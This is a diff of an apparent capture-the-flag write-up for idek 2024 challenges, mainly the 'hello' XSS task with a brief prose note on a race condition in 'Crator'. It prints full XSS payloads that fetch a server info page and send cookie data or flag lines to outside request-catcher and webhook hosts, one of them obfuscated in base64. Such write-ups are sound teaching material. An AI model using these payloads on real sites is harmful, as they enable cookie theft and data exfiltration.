@@ -37,6 +37,7 @@ fetch("/info.php/index.php")
 ```
 We can't put this directly due to the filter so we base64 encode it. Also we have to url encode the base64 string because of the '+' in it.
 The final payload to send to the bot:
+
 `http://idek-hello.chal.idek.team:1337/?name=<svg%0Conload=eval(atob("ZmV0Y2goIi9pbmZvLnBocC9pbmRleC5waHAiKQogIC50aGVuKHJlc3BvbnNlID0%2BIHJlc3BvbnNlLnRleHQoKSkKICAudGhlbihkYXRhID0%2BIGZldGNoKCJodHRwczovL3dlYmhvb2suc2l0ZS82MWZlYzE4ZC04NThjLTQ1OWEtYWQ4MC1iMzE2NWY3N2NhY2EvIiArIGJ0b2EoZGF0YS5zdWJzdHJpbmcoZGF0YS5pbmRleE9mKCIkX0NPT0tJRSIpLCBkYXRhLmluZGV4T2YoIiRfQ09PS0lFIikgKyAxMDApKSkpCg%3D%3D"))>`
 
 This works but there is another interesting approach: https://vaktibabat.github.io/posts/idek_2024/
@@ -49,18 +50,21 @@ fetch(window.location.href.substring(0, 7) + "idek-hello.chal.idek.team:1337" + 
 	response.text().then(function(txt) {
 	txt.split(`\n`).forEach(function(line) {
 		if(line.indexOf("FLAG")!=-1) {
-		fetch(window.location.href.substring(0, 7) + "mymockserver123456.free.beeceptor.com" + window.location.href.substring(5,6) + "cookies?resp=" + line)}
+		fetch(window.location.href.substring(0, 7) + "nopro.requestcatcher.com" + window.location.href.substring(5,6) + "cookies?resp=" + line)}
 	})
 	})
 })
 ```
 becomes 
 
-```http://idek-hello.chal.idek.team:1337/?name=<svg%0Conload=fetch(window.location.href.substring(0, 7)%2b"idek-hello.chal.idek.team:1337"%2bwindow.location.href.substring(5,6)%2b"info.php"%2bwindow.location.href.substring(5,6)%2b"index.php").then(function(response){response.text().then(function(txt){txt.split(`\n`).forEach(function(line){if(line.indexOf("FLAG")!=-1){fetch(window.location.href.substring(0, 7)%2b"mymockserver123456.free.beeceptor.com"%2bwindow.location.href.substring(5,6)%2b"cookies?resp="%2bline)}})})})>```
+```http://idek-hello.chal.idek.team:1337/?name=<svg%0Conload=fetch(window.location.href.substring(0, 7)%2b"idek-hello.chal.idek.team:1337"%2bwindow.location.href.substring(5,6)%2b"info.php"%2bwindow.location.href.substring(5,6)%2b"index.php").then(function(response){response.text().then(function(txt){txt.split(`\n`).forEach(function(line){if(line.indexOf("FLAG")!=-1){fetch(window.location.href.substring(0, 7)%2b"nopro.requestcatcher.com"%2bwindow.location.href.substring(5,6)%2b"cookies?resp="%2bline)}})})})>```
 which is sent to the bot.
 
 # Crator
 
 Its basically a race condition where you generate a file containing the flag using one endpoint, leave it on a infinite loop to prevent the file from getting deleted and extract the 
-flag using another endpoint before the code  execution of the first one is stopped by the instance(which happens in about 1s). Very detailed and better writeup:
+flag using another endpoint before the code  execution of the first one is stopped by the instance(which happens in about 1s).
+
+Very detailed and better writeup:
+
 https://vaktibabat.github.io/posts/idek_2024/
